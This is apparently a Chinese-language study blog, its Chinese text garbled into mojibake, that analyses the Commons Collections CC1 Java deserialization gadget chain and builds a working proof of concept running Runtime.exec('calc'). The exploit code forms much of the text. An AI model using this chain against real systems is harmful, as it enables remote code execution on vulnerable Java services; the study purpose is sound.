annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. //ä½¿ç”¨ for å¾ªç¯éå† memberValues.entrySet()ï¼Œå°†æ¯ä¸ªé”®å€¼å¯¹èµ‹å€¼ç»™memberValue for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); //æ ¹æ®æˆå‘˜åä»memberTypesä¸­è·å–å¯¹åº”çš„æˆå‘˜ç±»å‹ Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists //è·å–å½“å‰å¾ªç¯è¿­ä»£çš„å€¼ï¼ˆæˆå‘˜å€¼ï¼‰ Object value = memberValue.getValue(); //åˆ¤æ–­æˆå‘˜å€¼æ˜¯å¦ä¸æˆå‘˜ç±»å‹å…¼å®¹ if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { //å¦‚æœæˆå‘˜å€¼ä¸å…¼å®¹ï¼Œå°†ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„AnnotationTypeMismatchExceptionProxyå¯¹è±¡ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸ºå¯¹åº”çš„æˆå‘˜å€¼ memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \"[\" + value + \"]\").setMember( annotationType.members().get(name))); } } } } å¯ä»¥çœ‹åˆ°è¿™é‡Œå†è°ƒç”¨setValueå‰é¢è¿˜è¦ç»è¿‡ä¸¤ä¸ªåˆ¤æ–­ï¼Œè¿™é‡Œå†çœ‹ä¸€ä¸‹memberValuesæ˜¯å¦‚ä½•ä¼ å…¥çš„ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œçœ‹åˆ°æ˜¯åœ¨æ„é€ å‡½æ•°ä¸­ä¼ å…¥memberValueså½¢å‚å¯¹åº”çš„å€¼ï¼Œè¿™é‡Œå¯ä»¥çŸ¥é“memberValuesæ˜¯å¯æ§çš„ï¼Œåªéœ€è¦åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™ä¼ å…¥memberValueså³å¯ã€‚ä¸”è¿™é‡Œçš„æ„é€ å‡½æ•°çš„ä¿®é¥°ç¬¦æ˜¯é»˜è®¤çš„ æˆ‘ä»¬çŸ¥é“åœ¨ Java ä¸­ï¼Œå¦‚æœåœ¨æ„é€ å‡½æ•°çš„å®šä¹‰ä¸­æ²¡æœ‰æŒ‡å®šä¿®é¥°ç¬¦ï¼ˆå¦‚ public ã€ private ã€ protected æˆ–è€…é»˜è®¤çš„åŒ…çº§ç§æœ‰ï¼‰ï¼Œé‚£ä¹ˆè¯¥æ„é€ å‡½æ•°å°†å…·æœ‰é»˜è®¤çš„åŒ…çº§ç§æœ‰è®¿é—®ä¿®é¥°ç¬¦ã€‚é»˜è®¤çš„åŒ…çº§ç§æœ‰è®¿é—®ä¿®é¥°ç¬¦æ„å‘³ç€è¯¥æ„é€ å‡½æ•°å¯ä»¥åœ¨åŒä¸€ä¸ªåŒ…ä¸­çš„å…¶ä»–ç±»ä¸­è®¿é—®å’Œè°ƒç”¨ï¼Œä½†åœ¨ä¸åŒåŒ…ä¸­çš„ç±»ä¸­æ˜¯ä¸å¯è§çš„ã€‚ ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ„é€ å‡½æ•°åªèƒ½åœ¨sun.reflect.annotationåŒ…ä¸‹è¢«è°ƒç”¨ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åœ¨å¤–éƒ¨è°ƒç”¨ï¼Œå°±éœ€è¦åˆ©ç”¨åå°„ã€‚è¿™é‡Œç»“åˆå‰é¢ï¼Œæˆ‘ä»¬å¯ä»¥å†æ¬¡å†™å‡ºåˆ©ç”¨ä»£ç  æµ‹è¯•ä»£ç 2 import com.sun.javafx.collections.MappingChange; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.invoke.MethodHandle; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.lang.reflect.InvocationTargetException; import javax.swing.text.html.ObjectView; import java.util.HashMap; import java.util.Map; public class Cc1 { public static void main(String[] args) throws Exception { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(\"key\", \"value\"); Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null, invokerTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Override.class, decorateMap); serialize(obj); //åºåˆ—åŒ– unserialize(\"D:\\\\JavaStudy\\\\JavaCC1\\\\src\\\\main\\\\java\\\\Cc1.ser\"); //ååºåˆ—åŒ– } public static void serialize(Object object) throws Exception { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"D:\\\\JavaStudy\\\\JavaCC1\\\\src\\\\main\\\\java\\\\Cc1.ser\")); oos.writeObject(object); } public static void unserialize(String filename) throws Exception { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename)); objectInputStream.readObject(); } } ä½†è¿™é‡Œæˆ‘ä»¬åœ¨è¿è¡Œä¹‹åï¼Œå¹¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ é—®é¢˜1 è°ƒè¯•çœ‹çœ‹ï¼Œæ–­ç‚¹è®¾åœ¨AnnotationInvocationHandler.readObject()ä¹‹å‰è¯´çš„ä¸¤ä¸ªåˆ¤æ–­å¤„ï¼šè¿›è¡Œè°ƒè¯•è¿è¡Œ åœ¨è¿™é‡Œå¦‚æœæˆ‘ä»¬ç‚¹å‡»æ­¥è¿‡çš„è¯ï¼Œä¼šç›´æ¥è°ƒåˆ°ä¸‹é¢ï¼Œè¯´æ˜æˆ‘ä»¬æ²¡æœ‰è¿›å»ifåˆ¤æ–­è¯­å¥ã€‚è¿™é‡Œåˆ¤æ–­memberTypeï¼Œä½†æ˜¯æˆ‘ä»¬çš„memberTypeæ­£å¥½ä¸ºç©ºã€‚ memberTypeæ¥è‡ªmemberTypesï¼ŒmemberTypesæ¥è‡ªannotationTypeï¼ŒannotationType æ¥è‡ª type ï¼ˆ annotationType = AnnotationType.getInstance(type); ï¼‰ è€ŒTypeæ¥è‡ªæˆ‘ä»¬ä¼ å…¥çš„æ„é€ å‡½æ•°çš„å‚æ•° æˆ‘ä»¬è¿™é‡Œçš„è¦æ±‚ä¼ å…¥çš„æ³¨è§£å‚æ•°ï¼Œæ˜¯è¦æ±‚æœ‰æˆå‘˜å˜é‡çš„ï¼Œå¹¶ä¸”æˆå‘˜å˜é‡è¦å’Œ map é‡Œé¢çš„ key å¯¹çš„ä¸Šã€‚ ï¼ˆ ! (memberType.isInstance(value) ï¼‰ ä½†æ˜¯æˆ‘ä»¬ä¹‹å‰ä½¿ç”¨çš„Overrideæ³¨è§£æ²¡æœ‰æˆå‘˜å˜é‡ï¼Œæ‰€ä»¥ä¸è¡Œ è¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°äº†SuppressWarningsæ³¨è§£ï¼Œè¯¥æ³¨è§£æœ‰ä¸€ä¸ªæˆå‘˜å˜é‡ï¼š äºæ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆ‘ä»¬çš„ä»£ç ï¼šï¼ˆè¿™é‡Œæš‚æ—¶ä¸çŸ¥é“ä¸ºä½•è¦ä¿®æ”¹mapè¿™ä¸€å¤„ä»£ç ï¼‰ é—®é¢˜2 æ”¹å®Œä¹‹åæ¥ç€è¿è¡Œï¼Œå‘ç°æŠ¥é”™ï¼Œè¿™é‡Œè¯´æ‰¾ä¸åˆ°å¯¹åº”çš„execæ–¹æ³•ï¼Œçœ‹åˆ°ä¸Šè¿°Runtimeç±»çš„å¯¹è±¡rä¹Ÿæ˜¯ç°è‰²çš„ åŒæ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒreadObject æ–¹æ³•é‡Œé¢ setValue çš„å‚æ•°çš„å®ä¾‹å±…ç„¶æ˜¯å†™æ­»çš„ï¼Œæ ¹æœ¬æ²¡ç”¨åŠæ³•åˆ©ç”¨ è§£å†³æ— æ³•ä¼ å…¥runtimeçš„é—®é¢˜ åœ¨è§£å†³è¿™ä¸ªé—®é¢˜çš„æ—¶å€™ï¼Œæ–‡ç« çœ‹çš„æˆ‘å¾ˆç–‘æƒ‘ï¼Œæˆ‘ä¸ç†è§£ä»–ä»¬å¦‚ä½•æ‰¾åˆ°çš„é‚£äº›ç±»ï¼Œè¿™é‡Œçœ‹äº†ä¸ªbç«™çš„è§†é¢‘ï¼Œæœ‰æ‰€æ”¶è·ï¼Œè¿™é‡Œå°±å…ˆè·Ÿç€æ–‡ç« èµ°ä¸€æ³¢ï¼Œèµ°å®Œä¹‹ååœ¨æ€»ä½“å›é¡¾ä¸€ä¸‹é€‰æ‹©è¿™äº›ç±»çš„æ€è·¯ã€‚ è¿™é‡Œæ‰¾åˆ°æ–‡ç« æ‰€è¯´ç±»çš„åŸå› å¤§æ¦‚ç‡æ˜¯å‰æœŸå‡†å¤‡çš„å·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ‹¿å‡ºé‚£ä¸¤ä¸ªå…³é”®ç±»æ¥åˆ†æä¸€æ³¢ ChainedTransformer æˆ‘ä»¬å¯¹transFormæ–¹æ³•ç»§ç»­çœ‹çœ‹è°è°ƒç”¨äº†ï¼Œè¿™é‡Œæ‰¾åˆ°ä¸Šå›¾çš„ç±»å‘ç°å¾ˆæœ‰è¶£çš„åœ°æ–¹ï¼Œé¦–å…ˆè¿™ä¸ªç±»ChainedTransformeræ¥å—ä¸€ä¸ªTransformer[]æ•°ç»„èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ã€‚ æ¥ç€åœ¨transformæ–¹æ³•ä¸­ï¼Œæ¥å—ä¸€ä¸ªObjectå¯¹è±¡ï¼Œç„¶åè°ƒç”¨iTransformersæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼ˆå®é™…ä¸Šä»£è¡¨ç€è½¬æ¢å™¨ï¼‰ï¼Œç„¶åè°ƒç”¨æ¯ä¸ªè½¬æ¢å™¨çš„transformæ–¹æ³•ï¼Œä¼ å…¥Objectå¯¹è±¡ï¼Œå¹¶å°†è¿”å›å€¼æ›´æ–°ä¸ºæ–°çš„è½¬æ¢ç»“æœï¼Œä¾›ä»¥åå¾—iTransformersæ•°ç»„å…ƒç´ è°ƒç”¨ è‡³äºæˆ‘ä»¬ä¼šæƒ³åˆ°ä½¿ç”¨ä¸Šè¿°ç±»çš„åŸå› åœ¨äºè¿™é‡Œ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œçš„Runtimeæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹å°±çŸ¥é“è¯¥ç±»æ²¡æœ‰ç»§æ‰¿serializeæ¥å£ï¼Œå› æ­¤ä¸èƒ½è¢«ååºåˆ—åŒ–ï¼Œä½†å¦‚æœæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹Runtimeçš„åŸå‹Classã€‚å¦‚ä¸‹å›¾ï¼Œä¼šå‘ç°è¯¥ç±»å«æœ‰Serializableæ¥å£ï¼Œèƒ½è¿›è¡Œååºåˆ—åŒ– é‚£æˆ‘ä»¬éœ€è¦å…ˆåˆ©ç”¨åå°„è·å–ClassåŸå‹ï¼Œpayloadå¦‚ä¸‹ Class clazz = Class.forName(\"java.lang.Runtime\"); Method method = clazz.getMethod(\"getRuntime\", null); Runtime runtime = (Runtime) method.invoke(null,null); Method execMethod = clazz.getMethod(\"exec\", String.class); execMethod.invoke(runtime, \"calc\"); ç°åœ¨æˆ‘ä»¬ç»“åˆtransformæ–¹æ³•æ¥å®ç°ä¸Šè¿°ä»£ç  // Class clazz = Class.forName(\"java.lang.Runtime\"); // Method method = clazz.getMethod(\"getRuntime\", null); // Runtime runtime = (Runtime) method.invoke(null,null); // Method execMethod = clazz.getMethod(\"exec\", String.class); // execMethod.invoke(runtime, \"calc\"); //ç¬¬ä¸€æ®µå°±æ˜¯ä¸ºäº†è·å–getRuntimeæ–¹æ³• Method getRuntimeMethod = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class); //ç¬¬äºŒæ®µæ˜¯ä¸ºäº†æ‰§è¡ŒgetRuntimeæ–¹æ³•ï¼Œè·å–Runtimeå¯¹è±¡ Runtime runtime = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod); //é€šè¿‡Runtimeå¯¹è±¡æ‰§è¡Œexecæ–¹æ³• new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(runtime); ä¸Šé¢ä»£ç å†™çš„æ—¶å€™å¾ˆæ‡µé€¼ï¼Œä¹Ÿæ˜¯çœ‹äº†è§†é¢‘åŠ å¾ˆå¤šæ–‡ç« æ‰å¤§æ¦‚æ‡‚äº†çŸ¥é“å¦‚ä½•å†™ï¼Œä¸»è¦è¿˜æ˜¯ç†è§£äº†InvokerTransformeræ„é€ å‡½æ•°ä»¥åŠtransformæ–¹ä¹‹é—´çš„è”ç³»ï¼Œå°±æ¯”è¾ƒå¥½æ‡‚ä¸ºä½•æ˜¯ä¸Šé¢è¿™ç§å†™æ³•äº†ã€‚ ä¸‹é¢æ˜¯å¯¹Runtime.classä¸Runtime.class.getClassæ–¹æ³•ä¹‹é—´åŒºåˆ«çš„å›ç­”ï¼Œä½†å¯ä»¥çœ‹åˆ°è¿™ä¸¤ä¸ªæ²¡æœ‰åŒºåˆ«ã€‚ æ˜¯çš„ï¼Œ`Runtime.class` å’Œ `Runtime.class.getClass()` çš„ç»“æœæ˜¯ç›¸åŒçš„ï¼Œå®ƒä»¬éƒ½è¡¨ç¤º `Runtime` ç±»çš„ `Class` å¯¹è±¡ã€‚ `Runtime.class` æ˜¯ç›´æ¥è·å– `Runtime` ç±»çš„ `Class` å¯¹è±¡çš„è¡¨è¾¾å¼ï¼Œå®ƒè¿”å›çš„æ˜¯ä¸€ä¸ª `Class&lt;Runtime&gt;` ç±»å‹çš„å¯¹è±¡ï¼Œè¡¨ç¤º `Runtime` ç±»çš„ `Class` å¯¹è±¡ã€‚ è€Œ `Runtime.class.getClass()` æ˜¯å¯¹ `Runtime.class` æ‰€è¡¨ç¤ºçš„ `Class` å¯¹è±¡å†æ¬¡è°ƒç”¨ `getClass()` æ–¹æ³•ï¼Œå®ƒä¹Ÿè¿”å›çš„æ˜¯ä¸€ä¸ª `Class&lt;Runtime&gt;` ç±»å‹çš„å¯¹è±¡ï¼Œè¡¨ç¤º `Runtime` ç±»çš„ `Class` å¯¹è±¡çš„ `Class` å¯¹è±¡ã€‚ ä¸¤è€…çš„ç»“æœæ˜¯ç›¸åŒçš„ï¼Œéƒ½æ˜¯è¡¨ç¤º `Runtime` ç±»çš„ `Class` å¯¹è±¡ã€‚æ— è®ºæ˜¯ä½¿ç”¨ `Runtime.class` è¿˜æ˜¯ `Runtime.class.getClass()`ï¼Œéƒ½å¯ä»¥è·å–åˆ°ç›¸åŒçš„ç»“æœï¼Œç”¨äºåå°„ã€è·å–ç±»ä¿¡æ¯ç­‰æ“ä½œã€‚ è¿™é‡Œå†™äº†ä¸Šè¿°çš„ä»£ç ä¹‹åï¼Œæˆ‘ä»¬å‘ç°è¿™æ ·çš„åµŒå¥—æ‰§è¡Œåˆ›å»ºå‚æ•°å¤ªéº»çƒ¦äº†ï¼Œäºæ˜¯ä¹å¸ˆå‚…ä»¬æ‰¾åˆ°äº†å¯ä»¥å®Œç¾æ•´åˆæˆ‘ä»¬ä¸Šè¿°ä»£ç çš„ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹ public ChainedTransformer(Transformer[] transformers) { super(); iTransformers = transformers; } /** * Transforms the input to result via each decorated transformer * * @param object the input object passed to the first transformer * @return the transformed result */ public Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object; } è¿™é‡Œè™½ç„¶ä¸Šè¿°æåˆ°è¿‡ï¼Œä½†ä¸ºäº†å›å¿†ç»§ç»­åˆ†æä¸€éï¼Œé€»è¾‘ä¸»è¦å°±æ˜¯å¯¹ä¼ å…¥çš„Transformeræ•°ç»„å…ƒç´ çš„éå†ï¼Œä»å…ƒç´ 0å¼€å§‹ï¼Œæ¯è°ƒç”¨ä¸€æ¬¡ iTransformers[i].transform(object);å¾—åˆ°çš„objectéƒ½ä¼šè¢«ç”¨äºä¸‹ä¸ªå…ƒç´ transform(object)çš„æ“ä½œï¼Œå¦‚åŒæµæ°´çº¿ä¸€èˆ¬ï¼Œä¸Šä¸€æ¬¡çš„ç»“æœå½“åšä¸‹ä¸€æ¬¡çš„å¼€å§‹ã€‚è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†ä¸Šè¿°ä»£ç è¿™æ ·ä¿®æ”¹ Transformer[] transformers = { new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class);//è·å–Runitmeç±»çš„åŸå‹Classï¼Œä»¥ä¾¿ååºåˆ—åŒ– è¿™ä¸ªæ—¶å€™å¦‚æœæˆ‘ä»¬è¿è¡Œçš„è¯ï¼Œä¼šå‘ç°ä¾æ—§æŠ¥é”™ï¼Œæˆ‘ä»¬ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œçœ‹çœ‹ä¼ å‚æœ‰ä»€ä¹ˆé—®é¢˜ã€‚å¦‚ä¸‹å›¾çœ‹åˆ°ä¼ å…¥checkSetValueæ–¹æ³•çš„å‚æ•°æ ¹æœ¬ä¸æ˜¯æˆ‘ä»¬æœŸå¾…çš„Runtimeï¼Œæ ¹æœ¬åŸå› åœ¨äºä¸Šè¿°é—®é¢˜2æåˆ°çš„readObjectå…¥å£ç‚¹çš„setValueå‚æ•°ä¸å¯æ§ï¼Œé‚£æˆ‘ä»¬å†çœ‹çœ‹æœ‰ä»€ä¹ˆç±»å¯ä»¥è§£å†³ ConstantTransformer æˆ‘ä»¬ç»§ç»­è¿”å›æºå¤´çœ‹çœ‹è°ç»§æ‰¿äº†Transformerç±»æ¥å£ï¼Œå¦‚ä¸‹å›¾çš„ConstantTransformerç±»ï¼Œæˆ‘ä»¬å‘ç°ä»–å¯¹transformçš„å®ç°ä¸ºï¼Œä¸è®ºä¼ å…¥ä»€ä¹ˆå‚æ•°ï¼Œéƒ½è¿”å›ä¸€ä¸ªiConstantå¸¸é‡ã€‚é‚£å¦‚æœæˆ‘ä»¬å¯ä»¥å°†iConstantå¸¸é‡èµ‹å€¼ä¸ºRuntimeå¯¹è±¡ï¼Œé‚£å°±é¡ºåˆ©è§£å†³é“¾å­çš„é—®é¢˜äº† import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class Cc1 { public static void main(String[] args) throws Exception { Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(\"value\", \"value\"); Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(SuppressWarnings.class, decorateMap); serialize(obj); //åºåˆ—åŒ– unserialize(\"D:\\\\JavaStudy\\\\JavaCC1\\\\src\\\\main\\\\java\\\\Cc1.ser\"); //ååºåˆ—åŒ– } public static void serialize(Object object) throws Exception { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"D:\\\\JavaStudy\\\\JavaCC1\\\\src\\\\main\\\\java\\\\Cc1.ser\")); oos.writeObject(object); } public static void unserialize(String filename) throws Exception { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename)); objectInputStream.readObject(); } } å¯ä»¥çœ‹åˆ°æœ€ç»ˆæˆåŠŸè°ƒç”¨ é‡æ–°åˆ†æé“¾å­ è¿™é‡Œç®—æ˜¯åˆæ­¥åˆ†æå®Œäº†ï¼Œä½†è¿˜æ˜¯æœ‰ç‚¹æ‡µï¼Œæ¥ä¸‹æ¥å†é‡æ–°æ¢³ç†ä¸€éæ€è·¯ï¼Œå°±ä»ååºåˆ—åŒ–å…¥å£å¼€å§‹ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœä¸€ä¸ªç±»ç»§æ‰¿äº†serializeæ¥å£çš„æ—¶å€™ï¼Œé‚£åœ¨ååºåˆ—åŒ–å’Œåºåˆ—åŒ–çš„æ—¶å€™ï¼Œéƒ½ä¼šä¼˜å…ˆè°ƒç”¨è¯¥ç±»ä¸‹é‡å†™çš„readObjectä¸writeObjectæ–¹æ³•ï¼Œå¦‚æœè¯¥ç±»ä¸‹æ²¡æœ‰é‡å†™çš„è¯ï¼Œå°±ä¼šè°ƒç”¨javaé»˜è®¤çš„readObjectä¸writeObjectæ–¹æ³•ã€‚ å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°ï¼Œåœ¨è¯¥é“¾å­çš„å…¥å£å¤„ï¼Œç±»ä¸‹å«æœ‰é‡å†™çš„readObjectæ–¹æ³•ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åˆ†æå…¶forè¯­å¥ //ä¸»è¦å°±æ˜¯é’ˆå¯¹Map.Entryçš„ç”¨æ³•ï¼Œè¿™é‡Œæ˜¯å¯¹memberValues.entrySetè¿›è¡Œéå†ï¼Œå¹¶å°†å¾—åˆ°çš„é”®å€¼å¯¹èµ‹å€¼ç»™memberValue for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) { //nameå°±æ˜¯é”®å€¼å¯¹ä¸­çš„é”® String name = memberValue.getKey(); //é€šè¿‡getå‡½æ•°è·å–nameé”®å¯¹åº”çš„å€¼ï¼Œèµ‹å€¼ç»™memberTypeã€‚ Class&lt;?&gt; memberType = memberTypes.get(name); //åˆ¤æ–­ä¸Šè¿°è·å–çš„memberTypeå€¼æ˜¯å¦ä¸ºç©º if (memberType != null) { // i.e. member still exists //è·å–é”®å¯¹åº”çš„å€¼ Object value = memberValue.getValue(); //å¦‚æœvalueå€¼ä¸æ˜¯memberTypeçš„å®ä¾‹ï¼Œä¹Ÿä¸æ˜¯ExceptionProxyçš„å®ä¾‹ï¼Œåˆ™è¿›å…¥è¯¥ifè¯­å¥ if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { //è°ƒç”¨memberValueå…¶ä¸­çš„setValueæ–¹æ³• memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \"[\" + value + \"]\").setMember( annotationType.members().get(name))); } } } æ ¹æ®æˆ‘ä»¬æ„é€ çš„é“¾å­ï¼Œè¿™é‡Œçš„memberTypesä»£è¡¨çš„å°±æ˜¯æ³¨è§£ç±»å‹çš„å®ä¾‹ï¼Œåœ¨è¿™é‡Œæ˜¯æˆ‘ä»¬çš„ï¼šSuppressWarningsï¼Œè€Œè¯¥ç±»ä¸­åªå«æœ‰ä¸€ä¸ªvalueæ–¹æ³•ï¼Œç»è¿‡GPTçš„è§£é‡Šï¼Œæˆ‘ä¹Ÿç†è§£äº†å¯¹äºMap.Entryéå†çš„åŸºç¡€çŸ¥è¯†ã€‚ å› ä¸ºæˆ‘ä»¬éœ€è¦ä»¤memberType != nullä¸æˆç«‹ï¼Œä¹Ÿå°±æ˜¯memberType ä¸ä¸ºç©ºï¼Œå¦‚æœæˆ‘ä»¬é€‰æ‹©çš„æ˜¯å¸¸è§çš„æ³¨è§£ç±»å‹overrideæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºå…¶ä¸­æ²¡æœ‰ä»»ä½•å±æ€§æˆ–è€…æ–¹æ³•ã€‚ä½†SuppressWarningså«æœ‰valueæ–¹æ³•ï¼Œä¸ºäº†memberTypeä¸ä¸ºç©ºï¼Œæˆ‘ä»¬éœ€è¦åœ¨éå†ä¹‹å‰å†™ä¸‹è¯¥ä»£ç ï¼šmap.put(\"value\", \"value\");åä¸€ä¸ªvalueå€¼æ²¡æœ‰è¦æ±‚ï¼Œä½†ç¬¬ä¸€ä¸ªvalueå¿…é¡»ç›¸åŒï¼Œå› ä¸ºå½“éå†çš„æ—¶å€™åŒ¹é…åˆ°äº†è¯¥valueé”®ï¼Œå°±ä¼šå»æ‰¾å¯¹åº”çš„å€¼ï¼ˆå°±æ˜¯å‡½æ•°å¯¹åº”çš„å†…å®¹ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯value()ï¼‰å€˜è‹¥ä¸æ˜¯valueï¼Œä»–å°±æ‰¾ä¸åˆ°è¿”å›nullã€‚ è¿™é‡Œå¯¹äºç¬¬äºŒä¸ªifè¯­å¥ï¼Œä»–ä¼šåˆ¤æ–­valueçš„ç±»å‹ï¼Œä½†ç±»å‹æ˜¾ç„¶æ˜¯æ³¨è§£ç±»å‹çš„å±æ€§ï¼Œè‚¯å®šä¸æ˜¯ä¸Šè¿°çš„ä¸¤ä¸ªç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥ä¸€å®šä¼šè¿›å…¥ifè¯­å¥ã€‚è¿™é‡Œä¼šè°ƒç”¨memberValueçš„serValueæ–¹æ³•ï¼Œè€ŒmemberValueå·²ç»è¢«æˆ‘ä»¬èµ‹å€¼ä¸ºdecorateMapçš„Mapå®ä¾‹äº†ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿè¿›decorateMapå»çœ‹çœ‹å…·ä½“å¤„ç†ã€‚ decorateMapæ˜¯æ¥è‡ªTransformedMapç±»ï¼Œå¹¶ä¸”è¿˜æ˜¯AbstractInputCheckedMapDecoratorç±»çš„å­ç±» Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null, chainedTransformer); decorateMapæ¥æºæ˜¯TransformedMapçš„æ„é€ å‡½æ•°ï¼Œå…¶ä¸­èµ‹å€¼äº†ä¸€ä¸ªmapå®ä¾‹ï¼Œä»¥åŠå…³é”®çš„chainedTransformerç±»ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªåˆ†æ è¦çŸ¥é“è¿™é‡Œçš„decorateMapè°ƒç”¨äº†ä¸€ä¸ªentrySetæ–¹æ³•ï¼Œä½†å…¶æ‰€åœ¨TransformedMapç±»æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œå› æ­¤ä¼šå‘çˆ¶ç±»æ‰¾è¯¥æ–¹æ³•ï¼Œå·§çš„æ˜¯çˆ¶ç±»çš„ç¡®æœ‰è¯¥æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªåŒ…å«Map.Entryå¯¹è±¡çš„é›†åˆï¼Œè€Œæ¯ä¸ªMap.Entryå¯¹è±¡éƒ½è¡¨ç¤ºMapä¸­çš„ä¸€ä¸ªé”®å€¼å¯¹ è‡³äºä¸ºä½•æˆ‘ä»¬ä¸€å®šè¦æ·»åŠ map.put(\"value\", \"value\");é™¤äº†æ³¨é‡Šç±»å‹çš„åŸå› ä¹‹å¤–ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿè¸ªä¸€ä¸‹ ä¸Šè¿°è¿™é‡Œåˆæ˜¯è°ƒç”¨map.entrySetæ–¹æ³•ï¼Œæˆ‘ä»¬å¦‚æœçœ‹ä¸€ä¸‹mapçš„æ¥æºå°±ä¼šå‘ç°ï¼Œæ˜¯æ¥è‡ªçˆ¶ç±»çš„æ„é€ å‡½æ•°çš„map å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„æ„é€ å‡½æ•°ä¼šåˆ¤æ–­mapæ˜¯å¦ä¸ºç©ºï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»å…ˆå¯¹mapæ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹ã€‚ 